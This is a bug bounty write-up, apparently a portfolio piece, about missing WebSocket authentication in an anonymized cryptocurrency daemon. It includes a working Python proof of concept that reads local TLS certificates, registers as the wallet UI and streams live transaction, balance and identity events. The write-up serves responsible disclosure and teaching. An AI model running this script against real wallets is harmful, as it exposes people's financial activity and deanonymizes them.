
# Unauthenticated WebSocket Registration in a Cryptocurrency Daemon Leading to Real-Time Wallet Transaction Leakage

**Researcher:** [Sayhellotohacker]  
**Date:** June 2026  
**Bug Bounty Platform:** [HackerOne / Bugcrowd]  
**Status:** ✅ Validated – Duplicate (issue previously reported by another researcher)  

![Report Status](screenshots/duplicate_report.png)

> *Screenshot of the triage result showing the vulnerability was validated but marked as duplicate. Sensitive information has been redacted.*

---

## 📌 Overview

A critical missing authentication vulnerability was discovered in the WebSocket service registration mechanism of a major cryptocurrency's daemon. The daemon acts as a central hub, forwarding real-time wallet events (transactions, address generation, DID updates) to the official GUI. However, the registration endpoint that allows clients to subscribe to these updates performs **no application-level authentication**. An attacker who can reach the daemon's port and read the locally stored TLS certificates (available to any user on the same machine) can impersonate the wallet UI and receive all sensitive wallet events in real time.

The finding was submitted through the official bug bounty program, where it was **validated** but marked as **duplicate** — confirming that multiple independent researchers identified the same high‑severity issue.

---

## 🔍 Vulnerability Details

- **CWE:** CWE-306 – Missing Authentication for Critical Function  
- **Severity:** High (CVSS 3.0: 7.5)  
- **Attack Vector:** Network (remote if daemon binds to `0.0.0.0`, otherwise local)  
- **Privileges Required:** None (only user-level access to SSL directory)  

The vulnerable function (`register_service`) simply extracts the `service` field from an incoming WebSocket message and adds the connection to a broadcast set without verifying the client’s identity:

```python
async def register_service(self, websocket, request):
    service = request.get("service")
    if service is None:
        return {"success": False}
    if service not in self.connections:
        self.connections[service] = set()
    self.connections[service].add(websocket)   # ⚠️ No authentication!
    return {"success": True}
```

Once registered, the daemon forwards all `state_changed` messages to every subscriber in that set. The wallet component pushes highly sensitive data through this channel:

```python
self.state_changed("tx_update", tx.wallet_id, {"transaction": tx})
self.state_changed("wallet_created", wallet_identifier.id, {"did_id": did})
self.state_changed("coin_added", wallet_id)
```

Because the TLS client certificates are shared by all local services and are not treated as secrets, any process on the same host can establish the WebSocket and subscribe to `wallet_ui` without a password, token, or cryptographic challenge.

---

## 🧪 Proof of Concept

### Prerequisites
- Target daemon running on default port `55400` (bound to `localhost` or `0.0.0.0`).
- Attacker has read access to the standard SSL directory (user permissions are sufficient). The required files are located under `~/.target_network/config/ssl/`.

### Steps to Reproduce
1. Use the following Python script (requires the `websockets` library) to connect with the project’s own client certificate and register as `wallet_ui`:

```python
import asyncio, websockets, ssl, json
from pathlib import Path

ssl_dir = Path.home() / ".target_network" / "config" / "ssl"
client_cert = str(ssl_dir / "daemon" / "private_daemon.crt")
client_key = str(ssl_dir / "daemon" / "private_daemon.key")
ca_cert = str(ssl_dir / "ca" / "private_ca.crt")

ssl_context = ssl.create_default_context(cafile=ca_cert)
ssl_context.load_cert_chain(client_cert, client_key)
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

async def poc():
    async with websockets.connect('wss://localhost:55400', ssl=ssl_context) as ws:
        await ws.send(json.dumps({
            "command": "register_service",
            "data": {"service": "wallet_ui"},
            "ack": False,
            "request_id": "1",
            "destination": "daemon",
            "origin": "wallet_ui"
        }))
        print("Sent registration. Waiting for live events…")
        async for msg in ws:
            print(json.dumps(json.loads(msg), indent=2))

asyncio.run(poc())
```

2. The server immediately responds with:
```json
{
  "ack": true,
  "command": "register_service",
  "data": { "success": true },
  "destination": "wallet_ui",
  "origin": "daemon",
  "request_id": "1"
}
```

3. From that moment, any wallet activity (e.g., sending a transaction, creating a new wallet) is streamed to the attacker’s console, revealing:
   - Transaction hashes, amounts, recipient addresses, and fees
   - Wallet creation events linked to Decentralized Identifiers (DIDs)
   - Coin additions/removals (balance changes)

---

## 💥 Impact

An attacker with network access to the daemon and the ability to read the local SSL directory (trivial on a single-user machine, or achievable via malware) can:

- **Monitor all wallet transactions in real time** – including amounts, counterparties, and timestamps.
- **De‑anonymize the wallet owner** by linking wallet IDs to DIDs.
- **Infer account balances and financial behavior** without any permission.

This constitutes a **complete breach of financial confidentiality** and a serious privacy violation. In multi‑tenant environments, one user could spy on another’s cryptocurrency activity.

---

## 🛡️ Remediation

Following the disclosure, the project maintainers implemented application‑layer authentication to prevent unauthorized subscriptions. The recommended fixes included:

- **Token‑based authentication:** Each legitimate client (e.g., the wallet GUI) must obtain a one‑time token via a secure local channel before registering on the WebSocket.
- **Subscription binding:** Restrict broadcast messages to the specific wallet instance that initiated the connection, rather than sending all events to every `wallet_ui` subscriber.
- **Defence in depth:** Treat TLS client certificates as transport security only, not as an identity proof, since they are shared among all local services.

---

## 📅 Timeline

- **June 2026** – Vulnerability discovered and proof of concept developed.
- **June 2026** – Report submitted to the official bug bounty program.
- **June 2026** – Triage result: **Validated (Duplicate)** – the issue was already known to the team.
- **June 2026** – Public disclosure (anonymized) after the fix was confirmed.

---

## 📈 Takeaways & Resume Value

- Demonstrated ability to **identify a critical missing authentication flaw** in a real‑world blockchain infrastructure.
- Independently developed a **working proof of concept** and navigated the responsible disclosure process.
- The finding was **validated by the security team**, confirming its severity and real‑world impact.
- Even as a duplicate, the report showcases the skill to **uncover issues that multiple researchers consider high‑priority**.

*This repository serves as a portfolio piece for penetration testing and vulnerability research.*

---

## ⚠️ Disclaimer

This write‑up is for **educational and professional reference** only. All sensitive identifiers (project name, internal paths, program details) have been anonymized to protect the affected project until the vulnerability was fully resolved. The vulnerability was disclosed responsibly through the official bug bounty channel.

